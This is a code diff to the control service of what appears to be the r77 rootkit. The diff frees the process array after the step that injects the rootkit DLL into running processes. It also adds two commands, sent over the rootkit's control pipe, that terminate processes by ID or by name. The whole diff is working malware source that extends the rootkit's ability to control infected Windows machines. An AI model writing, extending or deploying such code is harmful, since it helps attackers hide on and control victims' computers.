@@ -7,6 +7,7 @@
 #include "r77header.h"
 #include "ProcessListener.h"
 #include "ControlPipeListener.h"
+#include <Shlwapi.h>
 #include <Psapi.h>
 
 BOOL WINAPI DllMain(_In_ HINSTANCE module, _In_ DWORD reason, _In_ LPVOID reserved)
@@ -209,6 +210,8 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 					InjectDll(processes[i], RootkitDll64, RootkitDll64Size);
 				}
 			}
+
+			FREE(processes);
 			break;
 		}
 		case CONTROL_PROCESSES_DETACH:
@@ -225,6 +228,53 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 		case CONTROL_PROCESSES_DETACH_ALL:
 		{
 			DetachAllInjectedProcesses();
+			break;
+		}
+		case CONTROL_PROCESSES_TERMINATE_ID:
+		{
+			DWORD processId;
+			DWORD bytesRead;
+			if (ReadFile(pipe, &processId, sizeof(DWORD), &bytesRead, NULL) && bytesRead == sizeof(DWORD))
+			{
+				HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, processId);
+				if (process)
+				{
+					TerminateProcess(process, 0);
+					CloseHandle(process);
+				}
+			}
+
+			break;
+		}
+		case CONTROL_PROCESSES_TERMINATE_NAME:
+		{
+			WCHAR name[MAX_PATH + 1];
+			if (ReadFileStringW(pipe, name, MAX_PATH + 1))
+			{
+				LPDWORD processes = NEW_ARRAY(DWORD, 10000);
+				DWORD processCount = 0;
+				WCHAR processName[MAX_PATH + 1];
+
+				if (EnumProcesses(processes, 10000 * sizeof(DWORD), &processCount))
+				{
+					processCount /= sizeof(DWORD);
+
+					for (DWORD i = 0; i < processCount; i++)
+					{
+						if (GetProcessFileName(processes[i], processName, MAX_PATH) && !StrCmpIW(processName, name))
+						{
+							HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, processes[i]);
+							if (process)
+							{
+								TerminateProcess(process, 0);
+								CloseHandle(process);
+							}
+						}
+					}
+				}
+
+				FREE(processes);
+			}
 			break;
 		}
 		case CONTROL_USER_SHELLEXEC:
